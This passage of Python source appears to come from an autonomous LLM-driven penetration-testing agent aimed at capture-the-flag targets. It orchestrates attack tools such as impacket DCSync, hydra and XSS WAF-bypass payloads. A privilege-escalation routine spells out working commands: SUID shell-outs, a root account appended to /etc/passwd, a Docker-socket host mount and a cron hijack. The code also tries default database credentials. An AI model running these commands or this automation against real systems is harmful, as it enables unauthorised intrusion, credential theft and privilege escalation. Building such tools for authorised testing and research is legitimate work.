                    exhaustion_summary = (
                        f"Plan exhausted. {n_tasks} tasks ({n_done} completed).\n"
                        + (f"Known endpoints ({n_endpoints}): {', '.join(ep_list)}" if ep_list else "No endpoints discovered.")
                        + (f"\nKnown services ({n_services}): {', '.join(svc_list)}" if svc_list else "")
                        + (f"\nCredentials: {len(state.credentials)} known" if state.credentials else "")
                        + thin_warning
                        + "\n[RECONSIDER] No flag found after exhausting the plan. "
                        "The evidence you've relied on may be incomplete or "
                        "misleading. What ELSE could this application be? "
                        "Also review the tools you used — some support multiple "
                        "services or operations beyond what you tried. If you "
                        "only used a subset of a tool's capabilities, explore "
                        "its other functions; the attack surface may be broader "
                        "than what the initial evidence suggested."
                    )
                    await self._review_and_update_plan(
                        {"id": "plan-exhausted", "instruction": "Plan exhausted",
                         "tool": "", "params": {}, "status": "done",
                         "attempts": 0, "result_summary": exhaustion_summary},
                        True, exhaustion_summary
                    )
                    # Try again — LLM may have added new tasks
                    if self._select_next_plan_task():
                        continue
                self._generate_phase_summary("exploit")
                log.info("Solo loop: plan exhausted after %d iterations", iteration - 1)
                break

            # ── Trace: task scheduling event ──
            self._task_log_event(
                "info", "task_scheduled",
                task_id=task.get("id", ""),
                tool=task.get("tool", ""),
                iteration=iteration,
            )

            task_instruction = task.get("instruction", "unknown")
            task_tool = task.get("tool", "")
            task_params = task.get("params", {})
            # LLM can produce params as a JSON string — normalize to dict
            if isinstance(task_params, str):
                try:
                    task_params = json.loads(task_params)
                except (json.JSONDecodeError, TypeError):
                    task_params = {"url": str(task_params)}

            # ── Direct execution for concrete tasks ──────────────────────
            # When the plan specifies exact tool + params, execute directly
            # instead of going through the LLM (which may silently change params).
            # Tasks without concrete params (e.g. exploratory curl_get) still
            # go through the LLM for creative decision-making.
            _direct_tools = {
                "shell_exec", "redis_cmd", "mysql_query", "psql_query",
                "mssql_query", "oracle_query", "ssh_exec", "ssh_key_exec",
                "impacket_psexec", "impacket_wmiexec", "impacket_pth",
                "impacket_secretsdump", "impacket_secretsdump_dcsync",
                "impacket_ticketer", "impacket_silver_ticket",
                "impacket_GetUserSPNs", "impacket_GetNPUsers",
                "nmap_port_range", "nmap_full_scan", "nmap_vulners_scan",
                "whatweb_scan", "dirb_scan", "gobuster_dir", "nikto_scan",
                "hydra_http_brute", "ffuf_fuzz", "tomcat_exploit",
                "php_filter_chain", "jwt_forge", "searchsploit_copy",
                "impacket_ntlmrelayx",
            }
            if task_tool and task_params and task_tool in _direct_tools:
                # Execute directly — plan params are authoritative
                task_tool_calls = [{
                    "name": task_tool, "arguments": task_params,
                    "id": f"direct-{task.get('id')}",
                }]
                print(f"\n[solo:{iteration}] task={task.get('id','')} → {task_tool} [direct]")
            else:
                # LLM-driven execution for flexible/exploratory tasks
                self._maybe_compress()
                if "-manual" in task.get("id", ""):
                    # Manual retry: force the LLM to use send_payload with the
                    # tested param. History shows it tends to wander to other
                    # endpoints otherwise.
                    tu_val = task_params.get("url", task_params.get("target_url", ""))
                    tp_val = task_params.get("param", task_params.get("parameter", "q"))
                    freedom_note = (
                        f"You MUST call send_payload(url=\"{tu_val}\", param=\"{tp_val}\", "
                        f"payload=..., method=\"GET\"). "
                        f"Do NOT call curl_get or http_post instead. "
                        f"Do NOT change the URL or param. "
                        f"The instruction below contains specific payloads to try."
                    )
                else:
                    if task_tool and task_tool != "curl_get":
                        freedom_note = (
                            f"You MUST call the tool '{task_tool}' now. "
                            f"Do not substitute another tool. "
                            f"Use the exact params listed below. "
                            f"The instruction describes what to do with this tool."
                        )
                    else:
                        freedom_note = (
                            f"You may use a different tool if you have a better approach, "
                            f"but you MUST target this task's objective."
                        )
                # Inject recent DKG artifacts so the LLM knows about
                # credentials/files/sessions discovered by prior tasks
                _recent_ctx = self._extract_recent_artifacts()
                task_prompt = (
                    f"Execute plan task {iteration}/{MAX_ITER}:\n"
                    f"  Instruction: {task_instruction}\n"
                    f"  Required tool: {task_tool if task_tool else '(choose the best tool)'}\n"
                    f"  Params: {json.dumps(task_params)}\n"
                    + (f"\n{_recent_ctx}\n" if _recent_ctx else "") +
                    f"\n{freedom_note}"
                )
                content, task_tool_calls = self.llm.generate(
                    prompt=task_prompt,
                    system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
                    tools=tool_defs,
                )

                if not task_tool_calls:
                    # Retry once with more explicit instruction
                    content2, task_tool_calls = self.llm.generate(
                        prompt=f"You MUST call the tool '{task_tool}' now. "
                               f"Do not explain. Just execute the function call.",
                        system_prompt=SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
                        tools=tool_defs,
                    )
                if not task_tool_calls:
                    log.info("[PLAN] task %s: LLM produced no tool calls — skipping",
                             task.get("id", ""))
                    task["status"] = "skipped"
                    continue
                tc_names = [tc.get('name', '?') for tc in task_tool_calls]
                print(f"\n[solo:{iteration}] task={task.get('id','')} → "
                      f"{', '.join(tc_names)}")

            # Execute tool calls for this task
            tc_names = [tc.get('name', '?') for tc in task_tool_calls]
            task_success = False  # at least one tool must succeed
            _any_success = False
            task_summary = ""
            _all_task_stdouts: list[str] = []  # accumulate all tool outputs (truncated)
            _raw_task_stdouts: list[str] = []  # full stdout for credential extraction
            _auto_test_negative = False  # track "no evidence" / "no flag"

            for tc in task_tool_calls:
                tc_name = tc.get("name", "")
                tc_args = tc.get("arguments", {})
                tc_id = tc.get("id", "")

                if self._time_exceeded():
                    self.llm.add_tool_result(tc_id, "Skipped: time exceeded")
                    continue

                self.step_count += 1

                # Auto-inject body_format for POST endpoints.
                # Only default to JSON when the endpoint's sample response
                # starts with { or [ (indicating a JSON API). Otherwise
                # keep the LLM's choice — cloud simulators (AWS STS/IAM)
                # and OIDC endpoints typically expect form-encoded data.
                if tc_name == "send_payload" and tc_args.get("method", "GET").upper() == "POST":
                    if not tc_args.get("body_format"):
                        url = tc_args.get("url", "")
                        dkg_eps = [e for e in self.dkg.query_nodes("Endpoint")
                                   if e.get("url", "") == url]
                        if dkg_eps:
                            _sample = (dkg_eps[0].get("sample_response") or "").strip()
                            if _sample.startswith("{") or _sample.startswith("["):
                                tc_args["body_format"] = "json"

                # Block local filesystem access — flag must come from the target
                if tc_name in ("curl_get", "http_post") and str(tc_args.get("url", "")).startswith("file://"):
                    result = ToolResult(
                        tool_name=tc_name, success=False,
                        stdout="BLOCKED: file:// URLs search the local host, not the target. "
                               "Only interact with the target service.",
                        stderr="", exit_code=1, elapsed_ms=0,
                    )
                else:
                    try:
                        if tc_name in self.attack_gateway.get_tool_names():
                            result = await self.attack_gateway.call(tc_name, tc_args)
                        elif tc_name in self.recon_gateway.get_tool_names():
                            result = await self.recon_gateway.call(tc_name, tc_args)
                        elif tc_name in self.mcp_pool.get_tool_names():
                            mcp_raw = await self.mcp_pool.call_tool(tc_name, tc_args)
                            mcp_text = json.dumps(mcp_raw, ensure_ascii=False)
                            is_error = mcp_raw.get("isError", False)
                            error_text = ""
                            if is_error:
                                content_list = mcp_raw.get("content", [])
                                if content_list and isinstance(content_list[0], dict):
                                    error_text = content_list[0].get("text", "")
                            result = ToolResult(
                                tool_name=tc_name,
                                success=not is_error,
                                stdout=error_text if is_error else mcp_text,
                                stderr=error_text,
                                exit_code=1 if is_error else 0,
                                elapsed_ms=0,
                            )
                        else:
                            result = ToolResult(
                                tool_name=tc_name, success=False,
                                stdout=f"Unknown tool: {tc_name}", stderr="",
                                exit_code=1, elapsed_ms=0,
                            )
                    except Exception as e:
                        result = ToolResult(
                            tool_name=tc_name, success=False,
                            stdout="", stderr=str(e),
                            exit_code=1, elapsed_ms=0,
                        )

                # ── Adaptive format retry ──────────────────────────
                # When send_payload/http_post gets HTTP 400 with one body
                # format, automatically retry with the opposite format.
                # Cloud API simulators (AWS STS/IAM/OIDC) often expect
                # form-encoded data while the LLM may have chosen JSON
                # (or vice versa). One retry costs ~2-5s but resolves
                # format mismatches without requiring the LLM to guess.
                if tc_name in ("send_payload", "http_post") and not result.success:
                    _res_stderr = (getattr(result, 'stderr', '') or '').lower()
                    _res_stdout = (getattr(result, 'stdout', '') or '').lower()
                    if ("400" in _res_stderr or "bad request" in _res_stderr
                            or "400" in _res_stdout or "bad request" in _res_stdout):
                        _cur_format = tc_args.get("body_format", "")
                        if _cur_format == "json":
                            tc_args["body_format"] = "form"
                            try:
                                if tc_name in self.attack_gateway.get_tool_names():
                                    result = await self.attack_gateway.call(tc_name, tc_args)
                                elif tc_name in self.recon_gateway.get_tool_names():
                                    result = await self.recon_gateway.call(tc_name, tc_args)
                            except Exception:
                                pass  # retry failed — keep original error
                        elif _cur_format in ("form", ""):
                            tc_args["body_format"] = "json"
                            try:
                                if tc_name in self.attack_gateway.get_tool_names():
                                    result = await self.attack_gateway.call(tc_name, tc_args)
                                elif tc_name in self.recon_gateway.get_tool_names():
                                    result = await self.recon_gateway.call(tc_name, tc_args)
                            except Exception:
                                pass  # retry failed — keep original error

                # ── Runtime tool blacklist & absent-service tracking ──
                _exit_code = getattr(result, 'exit_code', 0)
                _stderr = (getattr(result, 'stderr', '') or '')
                _stdout = (getattr(result, 'stdout', '') or '')
                _combined = (_stdout + " " + _stderr).lower()
                # Detect missing binary (e.g. netexec not on PATH)
                if _exit_code == 127 and "not found" in _stderr:
                    _match = re.search(r'/bin/[a-z]+sh:\s+\d+:\s+(\S+):\s+not found', _stderr)
                    _missing_bin = _match.group(1).strip() if _match else ""
                    if _missing_bin:
                        log.warning("Tool '%s' not found on PATH — blacklisting '%s'", _missing_bin, tc_name)
                        # Map to fallback if one exists (e.g. mssql_query→mssqlclient_query)
                        _TOOL_FALLBACK: dict[str, str] = {
                            "mssql_query": "mssqlclient_query",
                        }
                        _fallback = _TOOL_FALLBACK.get(tc_name, "")
                        self._BLACKLISTED_TOOLS[tc_name] = _fallback
                        if self.exploitation_plan and self.exploitation_plan.tasks:
                            self._sanitize_plan_tools(self.exploitation_plan.tasks)
                        # Auto-retry with fallback tool immediately
                        if _fallback:
                            log.info("Auto-retrying '%s' with fallback '%s'", tc_name, _fallback)
                            try:
                                if _fallback in self.attack_gateway.get_tool_names():
                                    fallback_result = await self.attack_gateway.call(_fallback, tc_args)
                                elif _fallback in self.recon_gateway.get_tool_names():
                                    fallback_result = await self.recon_gateway.call(_fallback, tc_args)
                                else:
                                    fallback_result = None
                                if fallback_result and getattr(fallback_result, 'success', False):
                                    result = fallback_result
                                    tc_name = _fallback
                                    log.info("Fallback '%s' succeeded", _fallback)
                                elif fallback_result:
                                    log.info("Fallback '%s' also failed (exit=%s)",
                                             _fallback, getattr(fallback_result, 'exit_code', '?'))
                            except Exception as _fb_err:
                                log.warning("Fallback '%s' error: %s", _fallback, _fb_err)
                # Detect broken binaries: Go/C binaries that start but
                # can't parse their own flags (e.g. corrupt gobuster
                # binary that rejects -w and -u even when present).
                if (_exit_code not in (0, 127)
                        and "must be specified" in _combined
                        and tc_name not in self._BLACKLISTED_TOOLS):
                    log.warning(
                        "Tool '%s' appears broken (binary rejects its own "
                        "flags) — blacklisting", tc_name
                    )
                    self._BLACKLISTED_TOOLS[tc_name] = ""
                    if self.exploitation_plan and self.exploitation_plan.tasks:
                        self._sanitize_plan_tools(self.exploitation_plan.tasks)
                # Track unreachable targets
                _target = (tc_args.get("url", "") or tc_args.get("host", "")
                           or tc_args.get("target", "") or "")
                if _target:
                    if (_exit_code == 7 and tc_name == "curl_get") or \
                       any(kw in _combined for kw in ("connection refused", "could not connect",
                                                       "no route to host", "can't connect")):
                        self._absent_services.add(_target)
                # Track absent DB services (Redis/MySQL/PG/Oracle probes)
                _DB_TOOLS = {"redis_cmd", "mysql_query", "psql_query", "mssql_query", "mssqlclient_query", "mssqlclient_query",
                             "oracle_query", "smbmap_enum"}
                if tc_name in _DB_TOOLS and not getattr(result, 'success', False):
                    _host = tc_args.get("host", "")
                    _port = tc_args.get("port", "")
                    if _host:
                        _label = f"{_host}:{_port}" if _port else _host
                        self._absent_services.add(_label)

                # Defense probe + bypass attempt
                defence_probe = ""
                if tc_name in self.EXPLOIT_TOOLS:
                    url = str(tc_args.get("url", tc_args.get("target_url", "")))
                    param = str(tc_args.get("param", tc_args.get("parameter", "q")))
                    method = str(tc_args.get("method", "GET"))
                    if url and not self.flag_pattern.findall(
                        getattr(result, 'stdout', '') or ''
                    ):
                        defence_probe = await self._probe_for_defense(url, param, method, tc_name)
                    # Re-evaluate full DPM defense pipeline when defense first detected
                    if defence_probe and "BLOCKED" in defence_probe and not self.defense_state.waf_type:
                        await self._detect_defenses()
                    # Attempt bypass if blocked
                    if defence_probe and "BLOCKED" in defence_probe:
                        bypass_payloads = {
                            "encoding_mutation": "<scr<script>ipt>alert(1)</scr</script>ipt>",
                            "case_alternation": "<ScRiPt>alert(1)</sCrIpT>",
                            "double_url": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
                        }
                        for strategy, payload in bypass_payloads.items():
                            try:
                                bp_result = await self.attack_gateway.call("send_payload", {
                                    "url": url, "param": param, "payload": payload,
                                    "method": method, "encode_type":
                                        "double_url" if "url" in strategy else "none",
                                })
                                bp_stdout = getattr(bp_result, 'stdout', '') or ''
                                bp_flags = self.flag_pattern.findall(bp_stdout)
                                if bp_flags:
                                    is_valid, reason = await self._verify_flag(
                                        bp_flags[0], bp_stdout,
                                        {"url": url, "param": param, "payload": payload},
                                        getattr(bp_result, "elapsed_ms", 0),
                                    )
                                    if is_valid:
                                        result = bp_result
                                        defence_probe = f"\n[DEFENSE BYPASS — {strategy}] SUCCESS: flag={bp_flags[0]}"
                                        break
                                elif getattr(bp_result, 'success', False):
                                    defence_probe += f"\n[DEFENSE BYPASS — {strategy}] Payload accepted, no flag"
                            except Exception:
                                pass

                # ── Trace: record final tool result (Execution Memory seed) ──
                self._task_log_event(
                    "info", "tool_result",
                    task_id=task.get("id", ""),
                    tool=tc_name,
                    success=bool(getattr(result, "success", False)),
                    exit_code=getattr(result, "exit_code", -1),
                    elapsed_ms=getattr(result, "elapsed_ms", 0),
                )

                # Logging
                result_stdout = getattr(result, 'stdout', '') or ''
                result_exit = getattr(result, 'exit_code', -1)
                flags_found = self.flag_pattern.findall(result_stdout)
                if flags_found:
                    log.info("[EXPLOIT] %s: FLAG FOUND %s", tc_name, flags_found[0])
                    _any_success = True
                elif defence_probe:
                    log.info("[EXPLOIT] %s: DEFENSE — %s", tc_name,
                             defence_probe[:120].replace('\n', ' '))
                elif getattr(result, 'success', False):
                    log.debug("[EXPLOIT] %s: OK (exit=%d, %d bytes) — no flag",
                              tc_name, result_exit, len(result_stdout))
                    _any_success = True
                else:
                    log.info("[EXPLOIT] %s: FAILED (exit=%d) — %s",
                             tc_name, result_exit,
                             (result_stdout[:100] or 'no output').replace('\n', ' '))

                # Format feedback for LLM
                tool_stdout = self._format_tool_feedback(tc_name, tc_args, result, defence_probe)
                if (tc_name == "file_upload" and not getattr(result, 'success', False)
                        and getattr(result, 'exit_code', 0) in (400, 403, 500)):
                    tool_stdout += (
                        "\n[HINT: HTTP 4xx/5xx on file upload often means the endpoint "
                        "requires additional form fields (IDs, directories, nonces, tokens). "
                        "Look at the plugin documentation, readme, or error messages to "
                        "discover the required parameters. Retry with extra_fields={\"key\":\"value\",...}. "
                        "Common examples: eeSFL_ID (numeric list ID), eeSFL_FileUploadDir "
                        "(target directory), action (ajax action), nonce (CSRF token).]"
                    )
                if (tc_name == "http_post" and not getattr(result, 'success', False)
                        and tc_args.get("url")):
                    for ep in self.dkg.query_nodes("Endpoint"):
                        if ep.get("url") == tc_args.get("url") and ep.get("body_format") == "json":
                            tool_stdout += (
                                "\n[HINT: this endpoint expects JSON body. "
                                "Try content_type='application/json']"
                            )
                            break

                log.debug("  [%s] %s", tc_name, str(tc_args)[:120])
                # Direct execution tasks skip LLM history — no preceding
                # assistant tool_calls message exists, so adding a tool
                # result here would break DeepSeek's API requirement
                # ("Messages with role 'tool' must be a response to a
                #  preceding message with 'tool_calls'").
                # The fix mechanism (stderr-aware) handles param errors instead.
                if not tc_id.startswith("direct-"):
                    _is_info = tc_name in ("wpscan_enum", "knowledge_search",
                        "nmap_port_range", "nmap_full_scan", "nikto_scan",
                        "dirb_scan", "gobuster_dir", "nvd_search_cves",
                        "searchsploit_search", "metasploit_search",
                        "go_exploitdb_search")
                    _limit = 7000 if _is_info else 3000
                    self.llm.add_tool_result(tc_id, tool_stdout[:_limit])

                # Auto-persist technology discoveries to DKG (before compression loses them)
                if tc_name in ("whatweb_scan",) and getattr(result, 'success', False):
                    parsed = getattr(result, "parsed_output", {})
                    _fingerprint = parsed.get("technologies", [])[:5]
                    if _fingerprint:
                        # Enrich the existing nmap Service node with
                        # whatweb fingerprint — do NOT create fake
                        # port-0 Service nodes.
                        _ww_host = self.target_host
                        from urllib.parse import urlparse as _up3
                        _ww_url = tc_args.get("target_url", "")
                        _ww_parts = _up3(_ww_url) if _ww_url else None
                        if _ww_parts and _ww_parts.hostname:
                            _ww_host = _ww_parts.hostname
                        _ww_port = (_ww_parts.port if _ww_parts and _ww_parts.port
                                    else 80)
                        _ww_svc_id = f"svc-{_ww_host}-{_ww_port}"
                        _ww_svc = self.dkg.get_node(_ww_svc_id)
                        if _ww_svc:
                            self.dkg.update_node(
                                _ww_svc_id,
                                {"fingerprint": _fingerprint},
                            )
                task_summary += f"{tc_name}: {'OK' if getattr(result,'success',False) else 'FAIL'}; "
                # Accumulate each tool's output for plan review context.
                # Include the file_upload HINT so the fix-and-retry LLM also
                # sees it (not just the plan-review LLM via tool_stdout).
                _out = getattr(result, 'stdout', '') or ''
                _err = getattr(result, 'stderr', '') or ''
                # Include stderr so the fix LLM can see parameter errors
                # (e.g. KeyError('host') when wrong param names are used)
                _combined = _out
                if _err:
                    _err_short = _err[:400]
                    _combined = f"{_out}\n[STDERR] {_err_short}"
                _hint = ""
                if (tc_name == "file_upload"
                        and not getattr(result, 'success', False)
                        and getattr(result, 'exit_code', 0) in (400, 403, 500)):
                    _hint = (
                        " [HINT: HTTP 4xx/5xx on file upload often means "
                        "required form fields are missing. Retry with "
                        "extra_fields={'eeSFL_ID':'1','eeSFL_FileUploadDir':'/wp-content/uploads/'} "
                        "or similar plugin-specific parameters.]"
                    )
                _all_task_stdouts.append(f"[{tc_name}] {_combined[:600]}{_hint}")
                # Track if automated test found nothing
                rl = (getattr(result, 'stdout', '') or '').lower()
                if "no evidence" in rl or "no flag" in rl:
                    _auto_test_negative = True

                # CTEG tracking
                raw_stdout = getattr(result, 'stdout', '') or ''
                _raw_task_stdouts.append(raw_stdout)  # full, for credential extraction
                _TOOL_VULN_MAP = {
                    "sqlmap_test": "SQLI", "xss_reflection_test": "XSS",
                    "command_injection_test": "CMDI", "ffuf_fuzz": "FUZZ",
                    "send_payload": "INJECTION", "hydra_http_brute": "AUTH",
                    "hydra_ssh_brute": "AUTH",
                }
                self._exploit_chain.append({
                    "tool": tc_name,
                    "url": str(tc_args.get("url", tc_args.get("target_url", ""))),
                    "method": str(tc_args.get("method", "GET")),
                    "param": str(tc_args.get("param", tc_args.get("parameter", ""))),
                    "params": str(tc_args)[:200], "result": raw_stdout[:200],
                    "vuln_type": _TOOL_VULN_MAP.get(tc_name, tc_name),
                    "mechanism": tc_name,
                })

                # Flag check
                flags = self.flag_pattern.findall(result_stdout)
                if flags:
                    is_valid, reason = await self._verify_flag(
                        flags[0], result_stdout, tc_args, getattr(result, "elapsed_ms", 0),
                        tool_name=tc_name,
                    )
                    if is_valid:
                        self.phase = OrchestratorPhase.DONE
                        return TaskResult(
                            success=True, flag=flags[0], steps=self.step_count,
                            tokens_used=self.llm.token_count,
                            time_elapsed=time.time() - self.start_time,
                        )

            # ── LLM reviews and updates plan after every task (VulnBot-style) ──
            task_success = _any_success
            task_result_text = self._summarize_task_result(
                tc_names, task_success, _all_task_stdouts
            )

            # ── Fix-and-retry: LLM analyzes failures, fixes param errors ──
            _fix_attempts = 0
            _task_tool = task.get("tool", "")
            while not task_success and _fix_attempts < 2 and _task_tool:
                fix = await self._analyze_and_fix_task(task, task_result_text)
                if not fix:
                    break

                # Partial success: auth worked, store credentials (Fix A)
                if fix.get("partial_success"):
                    creds = fix.get("credentials") or {}
                    if creds.get("username"):
                        _cred_id = f"cred-partial-{int(time.time())}"
                        _cred_port = int(task.get("params", {}).get("port", 0))
                        _cred_user = creds["username"]
                        _cred_pass = creds.get("password", "")
                        _cred_type = str(creds.get("cred_type", "mssql"))
                        self.dkg.add_node("Credential", _cred_id, {
                            "username": _cred_user,
                            "password": _cred_pass,
                            "host": self.target_host,
                            "port": _cred_port,
                            "source_host": self.target_host,
                            "cred_type": _cred_type,
                            "source": "partial_success",
                        })
                        # Also persist to CTEG for cross-task reuse
                        try:
                            self.cteg.add_credential(
                                host=self.target_host, port=_cred_port,
                                service_type=_cred_type,
                                username=_cred_user, password=_cred_pass,
                                source="partial_success",
                            )
                        except Exception:
                            pass
                        log.info("[PARTIAL SUCCESS] Stored credential '%s' (auth OK → CTEG)",
                                 creds["username"])
                    task_success = True
                    task_result_text = (
                        f"[PARTIAL SUCCESS — {fix.get('reason', 'auth OK, command failed')}]"
                    )
                    break

                # Merge corrected params into existing ones — the LLM
                # returns only the fields that need correction, not the
                # full parameter set. Replacing would drop host/command/etc.
                task["params"] = {**task["params"], **fix["corrected_params"]}
                reason = fix.get("reason", "corrected params")
                print(f"  [FIX] {task.get('id')}: {reason[:120]}")
                self.step_count += 1

                retry_result = await self._execute_single_tool(
                    _task_tool, task["params"]
                )
                retry_stdout = retry_result.stdout or ""
                retry_stderr = retry_result.stderr or ""

                if retry_result.success:
                    task_success = True
                    task_result_text = (
                        f"[FIXED — {reason[:100]}] "
                        f"{retry_stdout[:1200] or 'OK'}"
                    )
                    # Check for flag
                    flags = self.flag_pattern.findall(retry_stdout)
                    if flags:
                        is_valid, reason_flag = await self._verify_flag(
                            flags[0], retry_stdout, task.get("params", {}),
                            retry_result.elapsed_ms,
                            tool_name=_task_tool,
                        )
                        if is_valid:
                            self.phase = OrchestratorPhase.DONE
                            return TaskResult(
                                success=True, flag=flags[0],
                                steps=self.step_count,
                                tokens_used=self.llm.token_count,
                                time_elapsed=time.time() - self.start_time,
                            )
                else:
                    task_result_text = (
                        f"Fix attempt {_fix_attempts + 1} failed "
                        f"[{reason[:80]}]: {retry_stderr or retry_stdout or 'no output'}"
                    )
                _fix_attempts += 1

            # ── Auto-extract credentials from task output ────────────
            # When a task discovers working credentials (e.g. batch SSH
            # test via shell_exec), extract them into DKG Credential nodes
            # so subsequent tasks can use $credentials.* placeholders.
            if task_success and _raw_task_stdouts:
                await self._extract_credentials_from_task(
                    task, _raw_task_stdouts
                )

            await self._review_and_update_plan(
                task, task_success, task_result_text
            )
            log.info("[PLAN REVIEW] task %s → %s, plan updated",
                     task.get("id", ""), "done" if task_success else "failed")
            self._print_plan_status()

        log.info("_unified_llm_loop: %d iterations, flag not found", iteration)
        self._generate_phase_summary("exploit")

        # ── Phase log: exploit ──
        if self.phase_logger and self.exploitation_plan:
            _plan = self.exploitation_plan
            _done = sum(1 for t in _plan.tasks if t.get("status") == "done")
            _failed = sum(1 for t in _plan.tasks
                         if t.get("status") in ("failed", "skipped", "exhausted"))
            self.phase_logger.log_phase("exploit",
                f"Plan-driven exploit completed: {_done} done, {_failed} failed "
                f"of {len(_plan.tasks)} tasks ({iteration} iterations)",
                metadata={"tasks_done": _done, "tasks_failed": _failed,
                          "tasks_total": len(_plan.tasks),
                          "iterations": iteration})

        return None

    # DEPRECATED: not currently wired into the main run() loop.
    # Kept for potential future use in automated vuln-to-tool mapping.
    async def _execute_privesc(self, target_url: str) -> str | None:
        """Execute privilege escalation exploitation based on linux_priv_check results.

        Parses the output of linux_priv_check to detect specific privesc vectors
        (SUID binaries, writable /etc/passwd, Docker socket, capabilities, cron
        hijack, LD_PRELOAD) and executes the appropriate exploitation command.

        Returns a flag string if found, None otherwise.
        """
        # Run linux_priv_check to get detection results
        priv_result = await self.attack_gateway.call("linux_priv_check", {})
        if not priv_result or not getattr(priv_result, 'success', False):
            return None

        output = getattr(priv_result, 'stdout', '') or ''
        log.info("[privesc] Analyzing linux_priv_check output (%d bytes)", len(output))

        # Parse output sections and extract vectors
        vectors: dict[str, list[str]] = {
            "suid": [],
            "writable_passwd": False,
            "docker_socket": False,
            "capabilities": [],
            "cron_writable": [],
            "ld_preload": False,
        }

        # Detect SUID binaries
        suid_section = False
        for line in output.split("\n"):
            line = line.strip()
            if "=== SUID ===" in line:
                suid_section = True
                continue
            if line.startswith("==="):
                suid_section = False
                continue
            if suid_section and line:
                if "/find" in line:
                    vectors["suid"].append("find")
                elif "/vim" in line or "/vi" in line:
                    vectors["suid"].append("vim")
                elif "/bash" in line:
                    vectors["suid"].append("bash")
                elif "/python" in line or "/python3" in line:
                    vectors["suid"].append("python")
                elif "/nmap" in line:
                    vectors["suid"].append("nmap")
                elif "/perl" in line:
                    vectors["suid"].append("perl")

            # Detect writable /etc/passwd
            if "/etc/passwd" in line and "rw" in line:
                vectors["writable_passwd"] = True

            # Detect Docker socket
            if "/var/run/docker.sock" in line:
                vectors["docker_socket"] = True

            # Detect capabilities
            if "cap_sys_admin" in line.lower() or "cap_dac_read_search" in line.lower():
                vectors["capabilities"].append(line)

            # Detect writable cron jobs
            if "cron" in line.lower() and ("w" in line or "write" in line.lower()):
                # Extract the path
                parts = line.split()
                for p in parts:
                    if p.startswith("/") and "cron" in p:
                        vectors["cron_writable"].append(p)

            # Detect LD_PRELOAD in sudo
            if "LD_PRELOAD" in line:
                vectors["ld_preload"] = True

        log.info("[privesc] Detected vectors: SUID=%s, passwd=%s, docker=%s, caps=%d, cron=%d, ld_preload=%s",
                 vectors["suid"], vectors["writable_passwd"], vectors["docker_socket"],
                 len(vectors["capabilities"]), len(vectors["cron_writable"]), vectors["ld_preload"])

        # Execute exploitation commands based on detected vectors
        exploit_cmds: list[str] = []

        # SUID exploitation
        for suid_bin in vectors["suid"]:
            if suid_bin == "find":
                exploit_cmds.append("find / -name 'flag*' -exec cat {} \\; 2>/dev/null")
                exploit_cmds.append("find / -name '*.txt' -path '*/root/*' -exec cat {} \\; 2>/dev/null")
            elif suid_bin == "vim":
                exploit_cmds.append("vim -c ':py3 import os; os.system(\"cat /root/flag* /home/*/flag*\")' -c ':q!' /dev/null 2>/dev/null")
            elif suid_bin == "bash":
                exploit_cmds.append("bash -p -c 'cat /root/flag*' 2>/dev/null")
            elif suid_bin == "python":
                exploit_cmds.append("python3 -c 'import os; os.system(\"cat /root/flag* /home/*/flag*\")' 2>/dev/null")
            elif suid_bin == "nmap":
                exploit_cmds.append("nmap --script='os.execute(\"cat /root/flag*\")' 2>/dev/null")
            elif suid_bin == "perl":
                exploit_cmds.append("perl -e 'exec \"cat /root/flag*\";' 2>/dev/null")

        # Writable /etc/passwd
        if vectors["writable_passwd"]:
            exploit_cmds.append("echo 'privesc::0:0:root:/root:/bin/bash' >> /etc/passwd && su privesc -c 'cat /root/flag*'")

        # Docker socket
        if vectors["docker_socket"]:
            exploit_cmds.append("docker run --rm -v /:/host alpine:latest cat /host/root/flag* 2>/dev/null")

        # Cron hijack
        if vectors["cron_writable"]:
            for cron_path in vectors["cron_writable"][:2]:
                exploit_cmds.append(f"echo '#!/bin/bash\ncat /root/flag* > /tmp/out.txt' > {cron_path} && chmod +x {cron_path} && sleep 60 && cat /tmp/out.txt")

        # Capabilities
        if vectors["capabilities"]:
            exploit_cmds.append("getcap -r / 2>/dev/null | grep cap_dac_read_search | while read f; do echo \"=== $f ===\"; cat \"${f%% *}\" 2>/dev/null; done")

        if not exploit_cmds:
            log.info("[privesc] No exploitable vectors detected")
            return None

        # Execute each exploit command
        for cmd in exploit_cmds[:8]:  # Safety cap
            log.info("[privesc] Executing: %s", cmd[:100])
            result = await self.attack_gateway.call(
                "shell_exec", {"command": cmd}
            )
            if result and getattr(result, 'success', False):
                stdout = getattr(result, 'stdout', '') or ''
                flags = self.flag_pattern.findall(stdout)
                if flags:
                    is_valid, reason = await self._verify_flag(
                        flags[0], stdout, {"command": cmd},
                        getattr(result, "elapsed_ms", 0), tool_name="shell_exec",
                    )
                    if is_valid:
                        log.info("[privesc] Flag found via SUID/capability exploit: %s", flags[0])
                        return flags[0]

        return None

    async def _try_db_default_credentials(self, host: str, discovered_ports: list) -> None:
        """Try default credentials against discovered database services.

        Uses well-known default credential pairs for each DB type.  Results
        are written to DKG Credential nodes with source 'default_trial'.
        """
        _DB_DEFAULTS: dict[str, list[tuple[str, str]]] = {
            "mysql":      [("root", ""), ("root", "root"), ("root", "password")],
            "postgresql": [("postgres", "postgres"), ("postgres", ""), ("postgres", "password")],
            "redis":      [("", "")],
            "mssql":      [("sa", ""), ("sa", "sa"), ("sa", "Password123")],
            "oracle":     [("system", "oracle"), ("sys", "oracle")],
            "mongodb":    [("admin", "admin"), ("admin", ""), ("root", "root")],
        }
        _DB_PORT_PROTO = {3306: "mysql", 5432: "postgresql", 6379: "redis",
                         1433: "mssql", 1521: "oracle", 27017: "mongodb"}
        for p in discovered_ports:
            port = p.get("port", 0)
            proto = _DB_PORT_PROTO.get(port)
            if not proto or proto not in _DB_DEFAULTS:
                continue
            tool_map = {
                "mysql": "mysql_query", "postgresql": "psql_query",
                "redis": "redis_cmd", "mssql": "mssqlclient_query",
                "oracle": "oracle_query", "mongodb": "shell_exec",
            }
            tool = tool_map.get(proto)
            if not tool:
                continue
            for username, password in _DB_DEFAULTS[proto][:3]:
                try:
                    if proto == "mongodb":
                        r = await self.attack_gateway.call(
                            tool, {"command": f"echo 'db.runCommand({{ping:1}})' | mongosh mongodb://{username}:{password}@{host}:{port} --quiet 2>&1"}
                        )
                    elif proto == "redis":
                        r = await self.attack_gateway.call(
                            tool, {"command": "PING", "host": host, "port": port}
                        )
                    else:
